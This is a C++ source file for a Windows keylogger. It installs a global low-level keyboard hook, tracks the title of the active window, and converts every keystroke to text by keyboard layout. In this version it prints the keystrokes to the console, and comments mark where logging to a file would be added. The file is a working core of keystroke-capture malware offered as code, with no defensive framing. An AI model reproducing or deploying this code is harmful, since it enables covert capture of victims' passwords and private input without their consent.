#include<windows.h>
#include<iostream>
#include<fstream>
#include<map>
#include<time.h>
using namespace std;


const map<int, string> KEYS{
	{VK_CAPITAL, "[CAPSLOCK]" },
	{VK_BACK, "[BACKSPACE]" },
	{VK_DELETE, "[DELETE]" },
	{VK_RETURN, "[ENTER]" },
	{VK_SPACE, "[SPACE]" },
	{VK_TAB, "[TAB]" },
	{VK_SHIFT, "[SHIFT]" },
	{VK_LSHIFT, "[LSHIFT]" },
	{VK_RSHIFT, "[RSHIFT]" },
	{VK_CONTROL, "[CONTROL]" },
	{VK_LCONTROL, "[LCONTROL]" },
	{VK_RCONTROL, "[RCONTROL]" },
	{VK_MENU, "[ALT]" },
	{VK_LWIN, "[LWIN]" },
	{VK_RWIN, "[RWIN]" },
	{VK_ESCAPE, "[ESC]" },
	{VK_END, "[END]" },
	{VK_HOME, "[HOME]" },
	{VK_SNAPSHOT, "[PRNTSCREEN]" },
	{VK_LEFT, "[LEFT]" },
	{VK_RIGHT, "[RIGHT]" },
	{VK_UP,	 "[UP]" },
	{VK_DOWN, "[DOWN]" },
	{VK_PRIOR, "[PG_UP]" },
	{VK_NEXT, "[PG_DOWN]" },
	{VK_F1, "[F1]"},
	{VK_F2, "[F2]"},
	{VK_F3, "[F3]"},
	{VK_F4, "[F4]"},
	{VK_F5, "[F5]"},
	{VK_F6, "[F6]"},
	{VK_F7, "[F7]"},
	{VK_F8, "[F8]"},
	{VK_F9, "[F9]"},
	{VK_F10, "[F10]"},
	{VK_F11, "[F11]"},
	{VK_F12, "[F12]"},
};
HHOOK _hook;

// Save func prototype. Processed and save data
int Save(KBDLLHOOKSTRUCT& kbData);

// User thread function prototype
//DWORD WINAPI KeyloggerThread(LPVOID lpParametr);

// Callback func prototype. Event raised when keyboard key pressed
LRESULT CALLBACK KeyboardProc(
	int nCode,
	WPARAM wParam, // virtual-key code 
	LPARAM lParam // extended info about wParam
);

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0 && wParam == WM_KEYDOWN) {
		KBDLLHOOKSTRUCT kbData = *((KBDLLHOOKSTRUCT*)lParam);
		Save(kbData);
	}
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}


void SetKeylogHook()
{
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0)))
		MessageBox(NULL, L"0x00FF512 Failed!", NULL, MB_ICONERROR);
}

void Keylogger()
{
	MSG msg;
	SetKeylogHook();
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(_hook);
}


int Save(KBDLLHOOKSTRUCT& kbData)
{
	int key = kbData.vkCode;
	char previousW[256] = "";

	if (key == 1 || key == 2)
		return 0;

	HWND foregroundW = GetForegroundWindow();

	if (foregroundW) {
		DWORD threadID = GetWindowThreadProcessId(foregroundW, NULL);
		HKL kbLayout = GetKeyboardLayout(threadID);
		char currentW[256];
		GetWindowTextA(foregroundW, currentW, sizeof(currentW) / sizeof(char));
		time_t timestamp = time(NULL);
		if (strcmp(currentW, previousW)) {
			strcpy_s(previousW, sizeof(previousW), currentW);
			// Save to log new program this
		}
		if (KEYS.find(key) != KEYS.end()) {
			cout << key << " => " << KEYS.at(key) << endl;
			// Log data this
		}
		else {
			unsigned char keyboardState[256];
			for (int i = 0; i < 256; ++i)
				keyboardState[i] = static_cast<unsigned char>(GetKeyState(i));
			wchar_t wbuffer; // convert virtual key to Unicode according keyboard layout
			int result = ToUnicodeEx(key, kbData.scanCode, keyboardState, &wbuffer, sizeof(wbuffer) / sizeof(wchar_t), 0, kbLayout);
			if (result > 0) {
				char buffer[4] = { 0 }; // UTF-8 max 6-bytes
				WideCharToMultiByte(CP_ACP, 0, &wbuffer, 1, buffer, sizeof(buffer) / sizeof(char), 0, 0); // Unicode to ANSI
				cout << wbuffer << " => " << buffer << endl;
				// Log data this
			}
		}
	}
	return 0;
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
	Keylogger();
}











